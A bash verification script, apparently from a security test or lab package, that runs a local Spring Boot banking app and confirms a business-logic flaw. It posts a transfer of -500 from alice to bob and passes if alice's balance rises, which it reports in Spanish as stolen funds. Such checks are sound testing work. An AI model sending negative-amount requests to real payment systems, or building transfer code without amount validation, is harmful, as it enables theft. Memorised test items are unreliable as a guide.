#!/usr/bin/env bash
set -euo pipefail
cd "$(dirname "$0")"; PORT="${PORT:-8060}"; export PORT
pick_free_port() {
  local p="$1"
  if command -v lsof >/dev/null 2>&1; then local pid; pid=$(lsof -nP -tiTCP:"$p" -sTCP:LISTEN 2>/dev/null || true); [ -n "$pid" ] && kill -9 $pid 2>/dev/null || true; fi
  for _ in 1 2 3; do
    if (exec 3<>"/dev/tcp/127.0.0.1/$p") 2>/dev/null; then exec 3>&- 3<&-; p=$(( (RANDOM % 2000) + 8500 )); else echo "$p"; return; fi
  done
  echo "$p"
}
PORT=$(pick_free_port "$PORT"); export PORT
free_port_inline() { local p="$1" pid; pid=$(lsof -nP -tiTCP:"$p" -sTCP:LISTEN 2>/dev/null || true); [ -n "$pid" ] && kill -9 $pid 2>/dev/null || true; }
free_port_inline "$PORT"
./mvnw -q spring-boot:run > .verify.log 2>&1 & PID=$!
trap 'kill $PID 2>/dev/null; pkill -P $PID 2>/dev/null; free_port_inline "$PORT"' EXIT
for i in $(seq 1 200); do curl -sf -o /dev/null "http://127.0.0.1:$PORT/balance/alice" && break || sleep 0.5; done
curl -s -X POST "http://127.0.0.1:$PORT/transfer" --data "from=alice&to=bob&amount=-500" >/dev/null
ALICE=$(curl -s "http://127.0.0.1:$PORT/balance/alice" | grep -o '"balance":[0-9-]*' | grep -o '[0-9-]*$')
echo "saldo alice tras el abuso: $ALICE (inicial 1000)"
[ "$ALICE" -gt 1000 ] && { echo "VERIFY PASS: el monto negativo robo fondos (diseno inseguro confirmado)"; exit 0; } || { echo "VERIFY FAIL"; exit 1; }
